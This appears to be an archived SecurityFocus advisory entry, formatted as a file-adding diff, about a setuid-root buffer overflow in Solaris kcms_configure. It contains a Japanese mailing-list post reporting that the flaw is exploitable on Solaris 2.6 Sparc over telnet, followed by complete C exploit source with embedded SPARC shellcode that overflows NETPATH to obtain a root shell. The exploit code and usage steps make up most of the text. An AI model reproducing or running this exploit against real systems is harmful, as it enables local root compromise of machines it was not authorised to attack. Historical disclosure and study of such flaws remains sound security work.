@@ -1,0 +1,119 @@
+source: http://www.securityfocus.com/bid/452/info
+ 
+ 
+There is an unchecked sprintf() call in the versions of /usr/openwin/bin/kcms_configure shipped with solaris 2.5, 2.5.1 and 2.6. Unfortunately, kcms_configure is installed setuid root, making it possible for an attacker to overflow the buffer and have arbitrary code executed with superuser privileges. The consequence of this vulnerability being exploited is a local root compromise.
+
+UNYUN@ShadowPenguinSecurityです
+
+自己レスです。
+
+> なお、Solaris7 Sparc Editionにも同様の問題がありますが、
+> Solaris2.6(Sparc)では再現しませんでした。
+
+Solaris 2.6 (Sparc)でも再現するようです。
+Solaris 2.6 (Sparc)はコンソールログインした状態でチェックしたのですが、コ
+ンソールログインだとこの問題はSolaris7でも再現しないようです。ネットワー
+ク経由でのみ再現するようで、他のマシンからのtelnetにてSolaris2.6 (Sparc)
+でも再現することが確認されました。おそらく、intel版Solaris2.6も同様だと思
+われます。
+
+case 1: exploit可能
+
+hoge : コンソールログイン
+
+hoge# xhost +vul
+hoge# telnet vul
+Login:
+Password:
+vul% setenv DISPLAY hoge:0.0
+vul% gcc ex_kcms_configuresp.c
+vul% ./a.out
+#
+
+case 2: exploit不可能
+
+hoge : コンソールログイン
+
+hoge% gcc ex_kcms_configuresp.c
+hoge% ./a.out
+The specified profile could not be opened
+getlasterrorhoge%
+hoge%
+
+Sparcの場合、オフセット2092-2093,2112-2115をfakeすることにより、オフセッ
+ト2116-2119のRETが有効となるようで、intel版同様にローカルユーザーがroot権
+限を奪取できることが確認されました。なお、コード制限はIntel版より何故か甘
+くなっているようです・・・
+
+---- ex_kcms_configuresp.c
+/*=============================================================================
+   kcms_configure Exploit for Solaris2.6/7 Sparc Edition
+   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
+   Written by UNYUN (shadowpenguin@backsection.net)
+  =============================================================================
+*/
+
+#define ENV         "NETPATH="
+#define MAXBUF      3000
+#define RETADR      2116
+#define RETOFS      0x1300
+#define EXPADR      1200
+#define FAKEADR1    2092
+#define FAKEADR2    2112
+#define NOP         0xa61cc013
+
+char exploit_code[] =
+"\x82\x10\x20\x17\x91\xd0\x20\x08"
+"\x82\x10\x20\xca\xa6\x1c\xc0\x13\x90\x0c\xc0\x13\x92\x0c\xc0\x13"
+"\xa6\x04\xe0\x01\x91\xd4\xff\xff\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e"
+"\x2f\x0b\xdc\xda\x90\x0b\x80\x0e\x92\x03\xa0\x08\x94\x1a\x80\x0a"
+"\x9c\x03\xa0\x10\xec\x3b\xbf\xf0\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
+"\x82\x10\x20\x3b\x91\xd4\xff\xff";
+
+unsigned long get_sp(void)
+{
+__asm__("mov %sp,%i0 \n");
+}
+
+main()
+{
+    char            buf[MAXBUF];
+    unsigned int    i,ip,sp;
+
+    putenv("LANG=");
+    sp=get_sp();
+    printf("ESP =0x%x\n",sp);
+
+    for (i=0;i<MAXBUF-4;i+=4){
+        buf[i+3]=NOP&0xff;
+        buf[i+2]=(NOP>>8)&0xff;
+        buf[i+1]=(NOP>>16)&0xff;
+        buf[i  ]=(NOP>>24)&0xff;
+    }
+
+    ip=sp;
+    printf("FAKE=0x%x\n",sp);
+    buf[FAKEADR1+3]=ip&0xff;
+    buf[FAKEADR1+2]=(ip>>8)&0xff;
+    buf[FAKEADR1+1]=(ip>>16)&0xff;
+    buf[FAKEADR1  ]=(ip>>24)&0xff;
+    buf[FAKEADR2+3]=ip&0xff;
+    buf[FAKEADR2+2]=(ip>>8)&0xff;
+    buf[FAKEADR2+1]=(ip>>16)&0xff;
+    buf[FAKEADR2  ]=(ip>>24)&0xff;
+
+    ip=sp-RETOFS;
+    printf("EIP =0x%x\n",sp);
+    buf[RETADR+3]=ip&0xff;
+    buf[RETADR+2]=(ip>>8)&0xff;
+    buf[RETADR+1]=(ip>>16)&0xff;
+    buf[RETADR]=(ip>>24)&0xff;
+
+    strncpy(buf+EXPADR,exploit_code,strlen(exploit_code));
+
+    strncpy(buf,ENV,strlen(ENV));
+    buf[MAXBUF-1]=0;
+    putenv(buf);
+
+    execl("/usr/openwin/bin/kcms_configure","kcms_configure","1",0);
+}
